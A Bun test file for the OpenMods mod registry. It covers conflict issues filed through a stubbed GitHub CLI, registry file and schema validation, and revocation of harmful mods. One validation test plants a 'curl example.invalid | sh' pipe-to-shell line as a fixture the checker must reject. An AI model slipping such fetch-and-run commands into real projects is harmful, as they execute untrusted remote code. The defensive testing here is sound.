// The safety nets around published mods: the conflict issue a maintainer
// gets when a release breaks their mod (and its closing once fixed), the
// files a mod may contain, and revocation: a mod removed for doing harm is
// never built again, and a build that has it stops running it.
import { beforeAll, describe, expect, test } from "bun:test"
import { $ } from "bun"
import { chmodSync, existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import path from "node:path"
import { addFile, addVersion, cli, createHarness, createMod, greeting, release, run, sandbox, setGreeting, WATCH } from "./harness"

const sb = sandbox("safety")
const VALIDATE = path.resolve(import.meta.dir, "../../script/validate.ts")
const launcher = () => path.join(sb.om, "bin", "greet")
const friendlyDir = () => path.join(sb.reg, "mods", "t", "friendly", "fake")

// A stand-in for the GitHub CLI: it records every call, and answers
// `issue list` with whatever the test put in issues.json.
const ghLog = path.join(sb.T, "gh.log")
const ghIssues = path.join(sb.T, "issues.json")
async function watch(...a: string[]) {
  const p = Bun.spawn(["bun", WATCH, ...a, "--registry", sb.reg], {
    cwd: sb.reg,
    env: { ...process.env, PATH: `${path.join(sb.T, "bin")}:${process.env.PATH}`, GITHUB_REPOSITORY: "t/registry", GH_LOG: ghLog, GH_ISSUES: ghIssues },
    stdout: "pipe",
    stderr: "pipe",
  })
  const [out, err] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text()])
  return { code: await p.exited, out, err }
}

beforeAll(async () => {
  await createHarness(sb)
  await createMod(sb, "friendly", setGreeting("hello from friendly"))
  mkdirSync(path.join(sb.T, "bin"), { recursive: true })
  writeFileSync(
    path.join(sb.T, "bin", "gh"),
    `#!/bin/sh\nprintf '%s\\n---\\n' "$*" >> "$GH_LOG"\ncase "$1 $2" in\n  "issue list") cat "$GH_ISSUES" 2>/dev/null || echo "[]" ;;\n  "issue create") echo "https://github.com/t/registry/issues/1" ;;\nesac\n`,
  )
  chmodSync(path.join(sb.T, "bin", "gh"), 0o755)
})

describe("the conflict issue", () => {
  test("gives commands that restore the mod from the registry and move it onto the release", async () => {
    await release(sb, "v2.0.0", addFile("CHANGELOG.md", "2.0.0\n"))
    const results = path.join(sb.T, "results")
    mkdirSync(results, { recursive: true })
    writeFileSync(path.join(results, "friendly.json"), JSON.stringify({ mod: "t/friendly", harness: "fake", ref: "v2.0.0", commit: "x", applies: false, error: "patch does not apply" }))
    rmSync(ghLog, { force: true })
    const r = await watch("apply", results, "--issues")
    expect(r.code, r.err).toBe(0)
    const created = readFileSync(ghLog, "utf8").split("\n---\n").find((c) => c.startsWith("issue create"))!
    expect(created).toContain("t/friendly does not support Fake 2.0.0")
    expect(created).toContain("git checkout -b friendly v1.0.0")
    expect(created).toContain("git am ../openmods/mods/t/friendly/fake/v1.0.0/*.patch")
    expect(created).toContain("git rebase --onto v2.0.0 v1.0.0 friendly")
    expect(created).toContain("openmods install . --owner t")
    expect(created).toContain('openmods pack . --name friendly --owner t --registry ../openmods --note "works on Fake 2.0.0"')
    expect(created).toContain("--label conflict")
  })
  test("closes itself once the mod has a version for that release, and not before", async () => {
    writeFileSync(ghIssues, JSON.stringify([{ number: 7, title: "t/friendly does not support Fake 2.0.0" }]))
    rmSync(ghLog, { force: true })
    await watch("plan", "--issues", "--ref", "v2.0.0")
    expect(readFileSync(ghLog, "utf8")).not.toContain("issue close")
    await addVersion(sb, friendlyDir(), "v2.0.0")
    rmSync(ghLog, { force: true })
    const r = await watch("plan", "--issues", "--ref", "v2.0.0")
    expect(r.err).toContain("closed #7: t/friendly now supports Fake 2.0.0.")
    expect(readFileSync(ghLog, "utf8")).toContain("issue close 7")
    expect(() => JSON.parse(r.out)).not.toThrow() // the plan's JSON stays clean
  })
})

describe("the files a mod may contain", () => {
  test("anything besides mod.json, README.md, support.json and its patches fails the registry check", async () => {
    const extra = path.join(friendlyDir(), "setup.sh")
    writeFileSync(extra, "curl example.invalid | sh\n")
    const r = await $`bun ${VALIDATE} --registry ${sb.reg}`.nothrow().quiet()
    rmSync(extra)
    expect(r.exitCode).toBe(1)
    expect(r.stderr.toString()).toContain("fake/setup.sh is not a file a mod may contain")
  })
  test("a mod.json field the schema does not know fails it, so a typo is caught", async () => {
    const file = path.join(sb.reg, "mods", "t", "friendly", "mod.json")
    const before = readFileSync(file, "utf8")
    writeFileSync(file, JSON.stringify({ ...JSON.parse(before), descripton: "typo" }))
    let r
    try {
      r = await $`bun ${VALIDATE} --registry ${sb.reg}`.nothrow().quiet()
    } finally {
      writeFileSync(file, before)
    }
    expect(r.exitCode).toBe(1)
    expect(r.stderr.toString()).toContain('"descripton" is not a mod.json field')
  })
})

describe("a harness definition", () => {
  test("a sameRelease whose stockVersion grep or sed would not take, or with no group for the release, fails the registry check", async () => {
    const file = path.join(sb.reg, "harnesses", "fake.json")
    const before = readFileSync(file, "utf8")
    try {
      for (const stockVersion of ["(", "version=([0-9]", "version=[0-9.]+", "a#(b)"]) {
        writeFileSync(file, JSON.stringify({ ...JSON.parse(before), sameRelease: { stockVersion } }))
        const r = await $`bun ${VALIDATE} --registry ${sb.reg}`.nothrow().quiet()
        expect(r.exitCode, stockVersion).toBe(1)
        expect(r.stderr.toString()).toContain("sameRelease needs")
      }
      writeFileSync(file, JSON.stringify({ ...JSON.parse(before), sameRelease: { stockVersion: "version=([0-9.]+)", argsLast: { args: [] } } }))
      expect((await $`bun ${VALIDATE} --registry ${sb.reg}`.nothrow().quiet()).exitCode).toBe(1)
      writeFileSync(file, JSON.stringify({ ...JSON.parse(before), sameRelease: { stockVersion: "version=([0-9.]+)" } }))
      const ok = await $`bun ${VALIDATE} --registry ${sb.reg}`.nothrow().quiet()
      expect(ok.exitCode, ok.stderr.toString()).toBe(0)
    } finally {
      writeFileSync(file, before)
    }
  })
})

describe("revocation", () => {
  const revoke = (entry: object) => writeFileSync(path.join(sb.reg, "revoked.json"), JSON.stringify({ revoked: [entry] }))
  test("a revoked mod cannot be installed", async () => {
    revoke({ id: "t/friendly", reason: "It sends your files to a server." })
    const r = await cli(sb, "install", "t/friendly")
    expect(r.code).toBe(1)
    expect(r.err).toContain("t/friendly was removed from OpenMods: It sends your files to a server. It cannot be built.")
  })
  test("a build that already has it stops running it: every launch warns and starts the stock harness", async () => {
    rmSync(path.join(sb.reg, "revoked.json"))
    expect((await cli(sb, "install", "t/friendly")).code).toBe(0)
    expect(await greeting(sb)).toBe("hello from friendly")
    revoke({ id: "t/friendly", reason: "It sends your files to a server." })
    // Any command stops it, and says so once.
    const check = await cli(sb, "list")
    expect(check.out).toContain("t/friendly was removed from OpenMods")
    expect((await cli(sb, "list")).out).not.toContain("removed from OpenMods")
    for (let i = 0; i < 2; i++) {
      const run = await $`sh ${launcher()}`.nothrow().quiet()
      expect(run.stdout.toString().trim()).toBe("stock greet")
      expect(run.stderr.toString()).toContain("t/friendly was removed from OpenMods: It sends your files to a server.")
    }
    expect((await cli(sb, "status")).out).toContain("removed t/friendly was removed from OpenMods")
    const on = await cli(sb, "on")
    expect(on.code).toBe(1)
    expect(on.err).toContain("`openmods uninstall t/friendly` removes it")
  })
  test("`openmods update` says so too, and has nothing to update it to", async () => {
    rmSync(path.join(sb.reg, "revoked.json"))
    expect((await cli(sb, "on")).code).toBe(0)
    expect(await greeting(sb)).toBe("hello from friendly")
    revoke({ id: "t/friendly", reason: "It sends your files to a server." })
    const r = await cli(sb, "update", "fake")
    expect(r.out).toContain("t/friendly was removed from OpenMods: It sends your files to a server.")
    expect(r.out).not.toContain("already up to date")
    const run = await $`sh ${launcher()}`.nothrow().quiet()
    expect(run.stdout.toString().trim()).toBe("stock greet")
  })
  test("only the updates listed are revoked", async () => {
    revoke({ id: "t/friendly", updates: [2], reason: "Update 2 sends your files to a server." })
    const check = await cli(sb, "status")
    expect(check.out).not.toContain("removed from OpenMods")
  })
  test("an install from before update numbers were recorded is matched by its patches", async () => {
    const file = path.join(sb.om, "state.json")
    const state = JSON.parse(readFileSync(file, "utf8"))
    delete state.fake.updates
    writeFileSync(file, JSON.stringify(state))
    revoke({ id: "t/friendly", updates: [2], reason: "Update 2 sends your files to a server." })
    expect((await cli(sb, "status")).out).not.toContain("removed from OpenMods")
    revoke({ id: "t/friendly", updates: [1], reason: "Update 1 sends your files to a server." })
    expect((await cli(sb, "status")).out).toContain("t/friendly was removed from OpenMods")
  })
  test("it can be uninstalled even after it is deleted from the registry", async () => {
    revoke({ id: "t/friendly", reason: "It sends your files to a server." })
    rmSync(path.join(sb.reg, "mods", "t", "friendly"), { recursive: true })
    const r = await cli(sb, "uninstall", "t/friendly")
    expect(r.code, r.all).toBe(0)
    expect(await greeting(sb)).toBe("stock greet")
    expect((await cli(sb, "status")).out).toContain("No mods installed")
  })
})

describe("mods deleted from the registry", () => {
  test("a build is remade without them only when they are uninstalled together", async () => {
    rmSync(path.join(sb.reg, "revoked.json"), { force: true })
    await createMod(sb, "left", addFile("LEFT.md", "left\n"))
    await createMod(sb, "right", addFile("RIGHT.md", "right\n"))
    expect((await cli(sb, "install", "t/left", "t/right")).code).toBe(0)
    rmSync(path.join(sb.reg, "mods", "t", "left"), { recursive: true })
    rmSync(path.join(sb.reg, "mods", "t", "right"), { recursive: true })
    const one = await cli(sb, "uninstall", "t/left")
    expect(one.code).toBe(1)
    expect(one.err).toContain("t/right is no longer in the registry either")
    expect(one.err).toContain("openmods uninstall t/left t/right")
    const both = await cli(sb, "uninstall", "t/left", "t/right")
    expect(both.code, both.all).toBe(0)
    expect((await cli(sb, "status")).out).toContain("No mods installed")
  })
})

describe("the list of removed mods, fetched on its own", () => {
  // As raw.githubusercontent.com would serve it: the registry's revoked.json.
  let listed: object | null = null
  let down = false
  const server = Bun.serve({ port: 0, fetch: () => (down ? new Response("", { status: 503 }) : listed ? Response.json(listed) : new Response("", { status: 404 })) })
  const url = `http://localhost:${server.port}/revoked.json`
  const withUrl = (u: string, ...a: string[]) => run(sb, { env: { OPENMODS_REVOKED_URL: u } }, ...a)
  test("stops a mod the registry copy on this machine does not list yet, on any command", async () => {
    rmSync(path.join(sb.reg, "revoked.json"), { force: true })
    await createMod(sb, "later", addFile("LATER.md", "later\n"))
    expect((await cli(sb, "install", "t/later")).code).toBe(0)
    expect((await withUrl(url, "status")).out).not.toContain("removed from OpenMods")
    listed = { revoked: [{ id: "t/later", reason: "It deletes your files." }] }
    expect((await withUrl(url, "list")).out).toContain("t/later was removed from OpenMods: It deletes your files.")
    const launched = await $`sh ${launcher()}`.nothrow().quiet()
    expect(launched.stderr.toString()).toContain("t/later was removed from OpenMods")
  })
  test("when the list cannot be fetched, the last copy stands and the command still runs", async () => {
    down = true
    const r = await withUrl(url, "status")
    down = false
    expect(r.code).toBe(0)
    expect(r.out).toContain("t/later was removed from OpenMods")
  })
  test("a list that is not there (404) is a failed fetch, not an empty list", async () => {
    listed = null
    const r = await withUrl(url, "status")
    expect(r.out).toContain("t/later was removed from OpenMods")
  })
  test("the launcher's background look keeps a stopped build stopped when the list cannot be fetched", async () => {
    const r = await withUrl("http://127.0.0.1:9/never-fetched.json", "check-updates")
    expect(r.all).toBe("")
    expect((await withUrl(url, "check-updates")).all).toBe("")
    expect((await $`sh ${launcher()}`.nothrow().quiet()).stdout.toString().trim()).toBe("stock greet")
  })
  test("with no list at all (the copy damaged, the fetch failing), a stopped build stays stopped", async () => {
    writeFileSync(path.join(sb.om, "revoked.json"), "{ damaged")
    down = true
    expect((await withUrl(url, "status")).code).toBe(0)
    down = false
    expect((await $`sh ${launcher()}`.nothrow().quiet()).stdout.toString().trim()).toBe("stock greet")
    // One stopped by an older openmods, whose first comment differs.
    const launcherFile = launcher()
    writeFileSync(launcherFile, readFileSync(launcherFile, "utf8").replace(/^# .*$/m, "# openmods: this Fake build contains a mod removed from OpenMods, so it does not run."))
    down = true
    expect((await withUrl(url, "status")).code).toBe(0)
    down = false
    expect((await $`sh ${launcher()}`.nothrow().quiet()).stdout.toString().trim()).toBe("stock greet")
  })
  test("once it is taken off the list, the mod can be switched back on", async () => {
    listed = { revoked: [] }
    expect((await withUrl(url, "status")).out).not.toContain("removed from OpenMods")
    expect((await withUrl(url, "on")).code).toBe(0)
    expect((await $`sh ${launcher()}`.nothrow().quiet()).stdout.toString().trim()).not.toBe("stock greet")
  })
  test("every command checks", async () => {
    listed = { revoked: [{ id: "t/later", reason: "It deletes your files." }] }
    expect((await withUrl(url, "status")).out).toContain("t/later was removed from OpenMods")
  })
  test("a list with anything malformed in it is not taken; the last one stands", async () => {
    listed = { revoked: [null, { id: 3 }] }
    const r = await withUrl(url, "status")
    expect(r.code).toBe(0)
    expect(r.out).toContain("t/later was removed from OpenMods")
  })
  test("a fresh list is the list, even if this machine's registry copy still names the mod", async () => {
    writeFileSync(path.join(sb.reg, "revoked.json"), JSON.stringify({ revoked: [{ id: "t/later", reason: "It deletes your files." }] }))
    listed = { revoked: [] }
    expect((await withUrl(url, "status")).out).not.toContain("removed from OpenMods")
    rmSync(path.join(sb.reg, "revoked.json"))
  })
  test("the copy kept of one list is not used for another", async () => {
    listed = { revoked: [{ id: "t/later", reason: "It deletes your files." }] }
    expect((await withUrl(url, "status")).out).toContain("removed from OpenMods")
    // Another list, which cannot be reached: nothing is known about it.
    expect((await withUrl("http://127.0.0.1:9/other.json", "status")).out).not.toContain("removed from OpenMods")
    server.stop()
  })
})

describe("the list of removed mods, on a first install", () => {
  const fresh = sandbox("safety-first")
  const server = Bun.serve({ port: 0, fetch: () => Response.json({ revoked: [{ id: "t/early", reason: "It deletes your files." }] }) })
  test("is fetched before anything is installed, so a removed mod is refused", async () => {
    await createHarness(fresh)
    await createMod(fresh, "early", setGreeting("hello from early"))
    const r = await run(fresh, { env: { OPENMODS_REVOKED_URL: `http://localhost:${server.port}/revoked.json` } }, "install", "t/early")
    server.stop()
    expect(r.code).toBe(1)
    expect(r.err).toContain("t/early was removed from OpenMods: It deletes your files.")
  })
})

describe("status and a removed mod", () => {
  const box = sandbox("safety-status")
  test("fails, and says why, when the removed mod's launcher cannot be replaced", async () => {
    await createHarness(box)
    await createMod(box, "friendly", setGreeting("hello from friendly"))
    expect((await cli(box, "install", "t/friendly")).code).toBe(0)
    writeFileSync(path.join(box.reg, "revoked.json"), JSON.stringify({ revoked: [{ id: "t/friendly", reason: "It sends your files to a server." }] }))
    // A folder where the launcher is: nothing can be written there, whoever runs it.
    const launcherPath = path.join(box.om, "bin", "greet")
    rmSync(launcherPath)
    mkdirSync(path.join(launcherPath, "blocked"), { recursive: true })
    const r = await cli(box, "status")
    expect(r.code).not.toBe(0)
  })
  test("a launcher that merely cannot be brought up to date does not stop status", async () => {
    const box2 = sandbox("safety-status-refresh")
    await createHarness(box2)
    await createMod(box2, "friendly", setGreeting("hello from friendly"))
    expect((await cli(box2, "install", "t/friendly")).code).toBe(0)
    // A launcher from an older openmods (so it is due a refresh), where no file can be written.
    const launcherPath = path.join(box2.om, "bin", "greet")
    rmSync(launcherPath)
    mkdirSync(path.join(launcherPath, "blocked"), { recursive: true })
    const r = await run(box2, { env: { PATH: `${path.join(box2.om, "bin")}:${process.env.PATH}` } }, "status")
    expect(r.code, r.all).toBe(0)
    expect(r.err).toContain("note: could not update")
    expect(r.out).toContain("mods list  ")
    // A folder there is not a launcher: status does not claim the modded build runs.
    expect(r.out).not.toContain("greet → modded")
  })
})

